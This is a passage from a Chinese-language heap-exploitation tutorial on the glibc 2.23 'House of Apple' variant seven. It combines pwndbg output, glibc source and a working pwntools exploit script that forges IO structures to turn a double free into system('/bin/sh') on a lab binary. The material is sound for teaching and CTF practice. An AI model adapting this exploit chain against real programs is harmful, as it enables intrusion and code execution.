  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x57cfa21e6128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x57cfa21e6128
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x0
}
pwndbg> 
```

在可控的堆内存地址（例如`chunk0_addr + 0x200`），需要构建一个伪造的 **`_IO_codecvt`** 结构体。此结构是**整个利用链的终极执行枢纽**，其内部指针将直接指向并触发最终的恶意代码。

**该伪造结构的具体布局与决定性作用如下：**

1.  **设定`__codecvt_do_out`函数指针（装载最终利用指令）**：
    *   **赋值**：将此指针项设置为最终希望执行的函数地址。通常是两者择一：
        *   **`system`函数的地址**：用于执行任意系统命令，是获取shell的通用方法。
        *   一个合适的 **`one_gadget`** 地址：用于直接跳转到libc中一段能够启动shell的现有代码片段。
    *   **核心利用作用**：在`_IO_wdo_write`函数的执行路径中，当代码需要进行字符集转换时，会调用 **`(*cc->__codecvt_do_out) (cc, ...)`**。由于此前完全控制了`cc`（即指向此伪造结构的指针），此调用将**毫无阻碍地跳转**到预设的`system`或`one_gadget`地址，从而完全接管程序的控制流。

2.  **设定`__codecvt_destr`指针（提供利用参数）**：
    *   **赋值**：将此指针项设置为字符串 **`“/bin/sh”`** 的地址。
    *   **核心利用作用**：当上述`__codecvt_do_out`被调用时，其第一个参数`cc`正是这个伪造的`_IO_codecvt`结构体的地址。在`system`函数的调用约定中，`cc`被作为第一个参数（即命令字符串指针）传递。由于此前将`__codecvt_destr`布置在结构体起始附近并设置为`“/bin/sh”`，因此对`system(cc)`的调用，在内存解析上等同于 **`system(“/bin/sh”)`**，从而成功执行命令，获取shell。

**总结**：此步骤是完成整个利用链的“最后装填”阶段。通过在可控内存中精确伪造`_IO_codecvt`结构，并将其关键的函数指针和字符串指针指向利用载荷，成功地将glibc IO内部一个用于字符转换的合法调用，劫持并转化为一次可靠、可控的任意命令执行，最终达成利用目标。

```bash
pwndbg> p/x *(struct _IO_codecvt*)0x57cfa21e6200
$5 = {
  __codecvt_destr = 0x68732f6e69622f,
  __codecvt_do_out = 0x7fb02e43c3eb,
  __codecvt_do_unshift = 0x0,
  __codecvt_do_in = 0x0,
  __codecvt_do_encoding = 0x0,
  __codecvt_do_always_noconv = 0x0,
  __codecvt_do_length = 0x0,
  __codecvt_do_max_length = 0x0,
  __cd_in = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x57cfa21e6250
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x57cfa21e6250
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  },
  __cd_out = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x57cfa21e6290
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x57cfa21e6290
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  }
}
pwndbg> x/5i 0x7fb02e43c3eb
   0x7fb02e43c3eb <__libc_system>:      sub    rsp,0x8
   0x7fb02e43c3ef <__libc_system+4>:    test   rdi,rdi
   0x7fb02e43c3f2 <__libc_system+7>:    jne    0x7fb02e43c40a <__libc_system+31>
   0x7fb02e43c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7fb02e556d7b
   0x7fb02e43c3fb <__libc_system+16>:   call   0x7fb02e43be36 <do_system>
pwndbg> x/s 0x57cfa21e6200
0x57cfa21e6200: "/bin/sh"
pwndbg> 
```

整个利用链的最终引爆，始于一次主动触发的堆分配器致命错误。**再次释放**已位于large bin中的`chunk[0]`，会立即触发glibc的**双重释放（double-free）检测**。分配器在`_int_free`函数中识别到此异常，随即调用 **`malloc_printerr`** 函数进入错误处理流程。

`malloc_printerr`在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 函数，以强制刷新所有已打开的IO流缓冲区。此函数会遍历由全局指针`_IO_list_all`管理的IO链表。由于此前通过Large Bin Attack已将该指针成功劫持为指向`chunk[2]`，因此遍历直接从我们预先伪造的`_IO_FILE_plus`结构开始。

当执行流抵达`chunk[2]`处的伪造结构时，IO层会对其进行状态校验。得益于前期对`_mode`、`_IO_write_ptr`、`_IO_write_base`及关联的`_wide_data`等字段的**精确布局**，该伪造结构被成功地识别为一个“输出缓冲区有待刷新”的有效、活跃文件流。

这一状态判定导致IO层通过该结构的虚表（vtable）调用其 **`_IO_OVERFLOW`** 函数。由于我们已将伪造结构的虚表指针设置为 **`_IO_file_jumps`**，其`_IO_OVERFLOW`条目实际指向该跳转表中的 **`_IO_new_file_sync`** 函数。

至此，控制流被成功地、决定性地从通用的堆错误处理路径，导入了此前预先铺设的、以文件同步操作为起点的特定利用链。这标志着利用链从“布局”阶段正式迈入“执行”阶段，为后续通过复杂的IO内部函数链最终触发任意代码执行，打开了通道。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7fb02e46de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <__GI__IO_file_sync>
        rdi: 0x57cfa21e6940 ◂— 0
```

当控制流进入 **`_IO_new_file_sync`** 函数后，其内部首先会判断该文件流是否具有待刷新的输出数据。关键判断条件为 `if (fp->_IO_write_ptr > fp->_IO_write_base)`。

由于此前已在伪造的`_IO_FILE_plus`结构中将`_IO_write_ptr`设为`3`，`_IO_write_base`设为`2`，此比较条件（`3 > 2`）**明确成立**。这标志着该伪造流被识别为含有未写入的缓冲数据，从而触发后续的刷新操作。函数随即调用 **`_IO_do_flush (fp)`** 宏来执行实际的刷新。

`_IO_do_flush`是一个条件宏，其行为取决于`_mode`字段的值：
*   若`_mode <= 0`，则调用`_IO_do_write`处理窄字符流。
*   若`_mode > 0`，则调用`_IO_wdo_write`处理宽字符流。

由于我们已预先将`_mode`字段设置为`1`（`>0`），该宏**必然**展开为对 **`_IO_wdo_write (fp)`** 的调用。至此，控制流被精确地从文件同步逻辑，导入处理宽字符写入的核心函数。这是将利用链从通用的IO操作转向依赖于`_codecvt`（字符转换）结构的宽字符处理路径的关键一步，为最终触发`__codecvt_do_out`函数指针并执行任意代码扫清了障碍。

```bash
In file: /home/bogon/workSpaces/glibc/libio/fileops.c:874
   868 {
   869   _IO_ssize_t delta;
   870   int retval = 0;
   871 
   872   /*    char* ptr = cur_ptr(); */
   873   if (fp->_IO_write_ptr > fp->_IO_write_base)
 ► 874     if (_IO_do_flush(fp)) return EOF;
 
 ► 0x7fb02e46b260 <__GI__IO_file_sync+63>    call   _IO_wdo_write               <_IO_wdo_write>
        rdi: 0x57cfa21e6940 ◂— 0
        rsi: 2
        rdx: 0xffffffffffffffff
```

当控制流进入 **`_IO_wdo_write`** 函数后，利用进入最后的执行冲刺阶段。函数内部的状态与条件判断完全受到前期伪造数据的控制：

1.  **预设输出量`to_do`触发主路径**：
    *   函数首先计算待写入的数据量`to_do`，其值基于`_IO_wide_data`中的指针差。由于我们此前将`_wide_data->_IO_write_ptr`设置为一个极大值（`0xffffffffffffffff`），`to_do`的计算结果为一个巨大的正数，例如`0xfffffffffffffffd`，存储在`rdx`寄存器中。
    *   这使得条件判断 `if (to_do > 0)` **恒成立**，从而确保执行流进入处理实际写入操作的主逻辑分支，而非提前返回。

2.  **绕过缓冲区状态检查避免中断**：
    *   随后，函数检查 `if (fp->_IO_write_end == fp->_IO_write_ptr && fp->_IO_write_end != fp->_IO_write_base)`。此检查旨在识别“缓冲区已满但未完全写入”的状态，若成立可能引发额外的缓冲区管理操作或提前返回。
    *   由于我们在伪造`_IO_FILE`结构时，已将`_IO_write_end`设为`4`，`_IO_write_ptr`设为`3`，`_IO_write_base`设为`2`，使得`_IO_write_end == _IO_write_ptr`（4 == 3）的条件**不成立**。因此，**整个复合判断为假**，执行流顺利绕过此检查，避免了任何可能中断利用链的无关操作。

3.  **抵达最终跳转点执行代码**：
    *   在成功通过上述所有内部校验后，执行流抵达其预设的终点。在写入宽字符数据的过程中，函数会调用关联的`_codecvt`结构来完成编码转换，即执行 **`(*cc->__codecvt_do_out) (cc, ...)`** 调用。

由于此前已完全控制`cc`所指向的伪造`_IO_codecvt`结构，并将`__codecvt_do_out`指针设置为`system`地址，同时将`__codecvt_destr`设置为字符串`“/bin/sh”`，此函数调用即被转化为 **`system(“/bin/sh”)`** 的执行。至此，整个从堆破坏、信息泄露、全局指针劫持到复杂IO结构伪造与路径引导的精妙利用链宣告完成，成功**获取了目标系统的shell控制权**。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:93
    87               write_ptr = fp->_IO_write_ptr;
    88               write_base = fp->_IO_write_base;
    89               buf_end = fp->_IO_buf_end;
    90             }
    91 
    92           /* Now convert from the internal format into the external buffer.  */
 ►  93           result = (*cc->__codecvt_do_out) (cc, &fp->_wide_data->_IO_state,
    94                                             data, data + to_do, &new_data,
    95                                             write_ptr,
    96                                             buf_end,
    97                                             &write_ptr);
 
 ► 0x7fb02e4674aa <_IO_wdo_write+167>    call   qword ptr [r15 + 8]         <system>
        command: 0x57cfa21e6200 ◂— 0x68732f6e69622f /* '/bin/sh' */
```


### 1-40 house of apple其七

在glibc 2.24及更高版本引入严格的`_IO_FILE_plus`虚表（vtable）范围检查后，传统的IO流利用手段受到限制。**House of Apple**作为一种先进的利用思想，衍生出多种具体实现路径。其中一种高效变体，**将堆漏洞提供的任意地址写原语，与glibc内部一组合法的宽字符文件IO跳转表（`_IO_wfile_jumps`及其内存映射变体）相结合**，并通过伪造`_IO_codecvt`结构，构建一条能够通过所有安全检查的完整利用链。该方法的核心在于操控宽字符文件流的同步（sync）与写入路径来触发代码执行。

整个利用流程可系统地划分为以下三个递进的逻辑阶段：

**第一阶段：奠定利用基础——获取任意地址写原语**
首要步骤是利用堆漏洞（经典如**Large Bin Attack**）获得一次**向任意地址写入可控数据**的关键能力。此原语的直接目的是劫持全局IO流管理架构，通常通过向全局变量`_IO_list_all`写入一个可控的堆地址来实现，从而为后续所有操作铺平道路。

**第二阶段：构造恶意执行环境——伪造IO结构并劫持全局链表**
利用已获得的写能力，对IO子系统进行以下核心污染操作：
1.  **劫持全局IO链表头**：将管理所有文件流的全局指针`_IO_list_all`，修改为指向堆上预先布置的伪造`_IO_FILE_plus`结构。
2.  **设置合法虚表以通过范围验证**：**（此技术的核心与绕过关键）** 在该伪造结构中，将其虚表（vtable）指针设置为glibc内部合法的 **`_IO_wfile_jumps`**、`_IO_wfile_jumps_mmap`或`_IO_wfile_jumps_maybe_mmap`地址之一。由于这些地址位于libc认可的合法vtable内存区域，因此能通过严格的vtable范围验证。
3.  **布置完整的伪造数据结构链**：精确设置伪造结构中的各个字段，以精细控制后续的执行逻辑：
    *   将`_IO_FILE_plus`结构内的`_codecvt`指针指向一个伪造的`_IO_codecvt`结构。**这是整个利用链的最终执行枢纽**。在该伪造结构中：
        *   将 **`__codecvt_do_out`** 函数指针项设置为最终目标地址（如`system`）。
        *   将 **`__codecvt_destr`** 指针项设置为字符串`“/bin/sh”`，为`system`调用提供参数。
    *   精确设置`_mode`、`_IO_write_base`、`_IO_write_ptr`、`_IO_write_end`等状态字段，以满足从`_IO_flush_all_lockp`到`_IO_wdo_write`等一系列函数内部的路径检查，确保控制流不被中断。

**第三阶段：引爆利用链——引导文件同步与写入路径执行代码**
最终，当程序因调用`abort()`、`exit()`或触发堆错误处理（如`malloc_printerr`）而执行`_IO_flush_all_lockp`函数时，该函数会遍历被污染的IO链表。对于链表中伪造的文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_wfile_jumps`表中的 **`_IO_wfile_sync`** 函数。

控制流随后经过`_IO_wfile_sync` -> `_IO_do_flush`，最终进入 **`_IO_wdo_write`** 函数。在该函数处理宽字符写入的特定路径中，为执行必要的字符集转换，会调用与该文件流关联的`_codecvt`结构中的函数指针，即执行 **`(*cc->__codecvt_do_out) (cc, ...)`**。

由于此前已完全控制该`_IO_codecvt`结构，并将`__codecvt_do_out`设置为`system`地址，同时`__codecvt_destr`设置为`“/bin/sh”`，此调用即被转化为 **`system(“/bin/sh”)`** 的执行，从而成功获取shell，完成任意代码执行。

相关glibc完整源码参见[wfileops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/wfileops.c#L506)：

```c
const struct _IO_jump_t _IO_wfile_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_wfile_jumps)


const struct _IO_jump_t _IO_wfile_jumps_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close_mmap),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_maybe_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

struct _IO_codecvt
{
  void (*__codecvt_destr) (struct _IO_codecvt *);
  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,
					     __mbstate_t *,
					     const wchar_t *,
					     const wchar_t *,
					     const wchar_t **, char *,
					     char *, char **);
  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,
						 __mbstate_t *, char *,
						 char *, char **);
  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,
					    __mbstate_t *,
					    const char *, const char *,
					    const char **, wchar_t *,
					    wchar_t *, wchar_t **);
  int (*__codecvt_do_encoding) (struct _IO_codecvt *);
  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);
  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,
			      const char *, const char *, _IO_size_t);
  int (*__codecvt_do_max_length) (struct _IO_codecvt *);

  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};

struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

wint_t
_IO_wfile_sync (_IO_FILE *fp)
{
  _IO_ssize_t delta;
  wint_t retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if (_IO_do_flush (fp))
      return WEOF;
  delta = fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end;
  if (delta != 0)
    {
      /* We have to find out how many bytes we have to go back in the
	 external buffer.  */
      struct _IO_codecvt *cv = fp->_codecvt;
      _IO_off64_t new_pos;

      int clen = (*cv->__codecvt_do_encoding) (cv);

      if (clen > 0)
	/* It is easy, a fixed number of input bytes are used for each
	   wide character.  */
	delta *= clen;
      else
	{
	  /* We have to find out the hard way how much to back off.
	     To do this we determine how much input we needed to
	     generate the wide characters up to the current reading
	     position.  */
	  int nread;

	  fp->_wide_data->_IO_state = fp->_wide_data->_IO_last_state;
	  nread = (*cv->__codecvt_do_length) (cv, &fp->_wide_data->_IO_state,
					      fp->_IO_read_base,
					      fp->_IO_read_end, delta);
	  fp->_IO_read_ptr = fp->_IO_read_base + nread;
	  delta = -(fp->_IO_read_end - fp->_IO_read_base - nread);
	}

      new_pos = _IO_SYSSEEK (fp, delta, 1);
      if (new_pos != (_IO_off64_t) EOF)
	{
	  fp->_wide_data->_IO_read_end = fp->_wide_data->_IO_read_ptr;
	  fp->_IO_read_end = fp->_IO_read_ptr;
	}
#ifdef ESPIPE
      else if (errno == ESPIPE)
	; /* Ignore error from unseekable devices. */
#endif
      else
	retval = WEOF;
    }
  if (retval != WEOF)
    fp->_offset = _IO_pos_BAD;
  /* FIXME: Cleanup - can this be shared? */
  /*    setg(base(), ptr, ptr); */
  return retval;
}
libc_hidden_def (_IO_wfile_sync)

#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
# define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
#else
# define _IO_do_flush(_f) \
  _IO_do_write(_f, (_f)->_IO_write_base,				      \
	       (_f)->_IO_write_ptr-(_f)->_IO_write_base)
#endif

int
_IO_wdo_write (_IO_FILE *fp, const wchar_t *data, _IO_size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;

  if (to_do > 0)
    {
      if (fp->_IO_write_end == fp->_IO_write_ptr
	  && fp->_IO_write_end != fp->_IO_write_base)
	{
	  if (_IO_new_do_write (fp, fp->_IO_write_base,
				fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
	    return WEOF;
	}

      do
	{
	  enum __codecvt_result result;
	  const wchar_t *new_data;
	  char mb_buf[MB_LEN_MAX];
	  char *write_base, *write_ptr, *buf_end;

	  if (fp->_IO_write_ptr - fp->_IO_write_base < sizeof (mb_buf))
	    {
	      /* Make sure we have room for at least one multibyte
		 character.  */
	      write_ptr = write_base = mb_buf;
	      buf_end = mb_buf + sizeof (mb_buf);
	    }
	  else
	    {
	      write_ptr = fp->_IO_write_ptr;
	      write_base = fp->_IO_write_base;
	      buf_end = fp->_IO_buf_end;
	    }

	  /* Now convert from the internal format into the external buffer.  */
	  result = (*cc->__codecvt_do_out) (cc, &fp->_wide_data->_IO_state,
					    data, data + to_do, &new_data,
					    write_ptr,
					    buf_end,
					    &write_ptr);

	  /* Write out what we produced so far.  */
	  if (_IO_new_do_write (fp, write_base, write_ptr - write_base) == EOF)
	    /* Something went wrong.  */
	    return WEOF;

	  to_do -= new_data - data;

	  /* Next see whether we had problems during the conversion.  If yes,
	     we cannot go on.  */
	  if (result != __codecvt_ok
	      && (result != __codecvt_partial || new_data - data == 0))
	    break;

	  data = new_data;
	}
      while (to_do > 0);
    }

  _IO_wsetg (fp, fp->_wide_data->_IO_buf_base, fp->_wide_data->_IO_buf_base,
	     fp->_wide_data->_IO_buf_base);
  fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr
    = fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_write_end = ((fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
				   ? fp->_wide_data->_IO_buf_base
				   : fp->_wide_data->_IO_buf_end);

  return to_do == 0 ? 0 : WEOF;
}
libc_hidden_def (_IO_wdo_write)
```

本方法的成功执行，最终依赖于glibc内部一条确定的、从堆管理器错误处理到文件流同步刷新的完整路径。通过触发堆分配器错误（例如双重释放一个已位于large bin中的内存块），引导程序调用 **`malloc_printerr`** 函数。该函数在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 以强制刷新所有已注册的IO流。

`_IO_flush_all_lockp` 函数遍历由全局指针 `_IO_list_all` 管理的IO链表，并对其中每个文件流调用其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已通过Large Bin Attack将`_IO_list_all`劫持，并插入了一个虚表设置为 **`_IO_wfile_jumps`** 的伪造`_IO_FILE_plus`结构，因此实际被调用的`_IO_OVERFLOW`函数即为该表中的 **`_IO_wfile_sync`**。

**完整的控制流路径如下：**

1.  **`malloc_printerr`**：堆错误处理的入口，触发IO流刷新。
2.  **`_IO_flush_all_lockp`**：遍历IO链表，对每个流调用其`_IO_OVERFLOW`。
3.  **`_IO_OVERFLOW` (即 `_IO_wfile_sync`)**：这是`_IO_wfile_jumps`虚表中`_IO_OVERFLOW`项的实现，负责执行文件流的同步操作。它将控制流导向实际的刷新逻辑。
4.  **`_IO_do_flush`**：一个根据`_mode`字段选择窄字符或宽字符处理路径的条件宏。由于伪造结构的`_mode`被设为`1`（宽字符），它展开为对`_IO_wdo_write`的调用。
5.  **`_IO_wdo_write`**：负责处理宽字符流的实际写入逻辑。这是触发最终代码执行的关键节点，在其执行路径中会调用关联的`_codecvt`结构进行字符转换。
6.  **`__codecvt_do_out`**：位于伪造的`_IO_codecvt`结构中的函数指针，已在此前被设置为`system`等目标函数地址。当`_IO_wdo_write`执行到转换步骤时，调用 **`(*cc->__codecvt_do_out) (cc, ...)`**，由于`__codecvt_destr`被设置为字符串`“/bin/sh”`，该调用实际执行 **`system(“/bin/sh”)`**。

**总结利用链**：

**`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` (`_IO_wfile_sync`) → `_IO_do_flush` → `_IO_wdo_write` → `__codecvt_do_out` (`system`)**。

通过精心构造IO结构并劫持该链条，将一次堆错误处理转化为对任意命令的可靠执行。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_seven/exploit.py)。

核心利用代码如下：

```python
# house of apple seven
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
log.info(f"_IO_wfile_jumps addr: {hex(_IO_wfile_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

fake_wide_data = b"\x00" * 0x18 + p64(2)
fake_wide_data = fake_wide_data.ljust(0x20, b"\x00") + p64(0xFFFFFFFFFFFFFFFF)
payload = b"\x00" * 0x20 + fake_wide_data
fake_codecvt = b"/bin/sh\x00" + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_codecvt
edit(0, len(payload), payload)

fake_io = p64(0)
fake_io = fake_io.ljust(0x20 - 0x10, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0x30 - 0x10, b"\x00") + p64(4)
fake_io = fake_io.ljust(0x98 - 0x10, b"\x00") + p64(chunk0_addr + 0x200)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0 - 0x10, b"\x00") + p64(1)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_wfile_jumps + 0x48)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_seven/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在堆漏洞利用的起始阶段，准确获取目标进程的内存布局信息是至关重要的前提。一种经典且高效的技术是引导一个空闲堆块在glibc分配器的不同容器间移动，利用其管理元数据的变化来提取地址。具体而言，通过安排一个堆块从**unsorted bin**迁移到**large bin**，可以借助后者特有的指针结构，同时泄露**libc的基地址**和**堆区域的起始地址**。

**完整的操作步骤与其实现原理如下：**

1.  **构建初始堆布局**
